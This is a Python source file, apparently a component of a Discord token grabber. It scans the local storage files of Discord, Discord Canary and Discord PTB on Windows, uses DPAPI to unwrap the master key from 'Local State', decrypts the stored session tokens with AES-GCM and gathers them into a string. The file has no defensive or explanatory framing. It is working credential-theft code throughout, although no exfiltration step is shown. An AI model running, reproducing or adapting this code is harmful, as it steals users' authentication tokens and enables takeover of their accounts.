import os
import re
import base64
import json

from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES

class Discord():
	def __init__(self):
		self.tokens = []
		self.saved = ""
		self.appdata = os.getenv("localappdata")
		self.roaming = os.getenv("appdata")
		self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
		self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
		self.discord()
		self.neatify()

	def discord(self):
		discordPaths = {
			'Discord':self.roaming + '\\discord\\Local Storage\\leveldb\\',
			'Discord Canary':self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
			'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\'
		}

		for name, path in discordPaths.items():
				if not os.path.exists(path):
					continue
				_discord = name.replace(" ", "").lower()
				if "cord" in path:
					if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
						continue
					for file_name in os.listdir(path):
						if file_name[-3:] not in ["log", "ldb"]:
							continue
						for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
							for y in re.findall(self.regexp_enc, line):
								token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
														1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
								self.tokens.append(token)

	def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
		iv = buff[3:15]
		payload = buff[15:]
		cipher = AES.new(master_key, AES.MODE_GCM, iv)
		decrypted_pass = cipher.decrypt(payload)
		decrypted_pass = decrypted_pass[:-16].decode()

		return decrypted_pass

	def get_master_key(self, path: str) -> str:
		if not os.path.exists(path):
			return

		if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
			return

		with open(path, "r", encoding="utf-8") as f:
			c = f.read()
		local_state = json.loads(c)

		master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
		master_key = master_key[5:]
		master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

		return master_key
	
	def neatify(self):
		for token in self.tokens:
			self.saved += "%s\n" % token
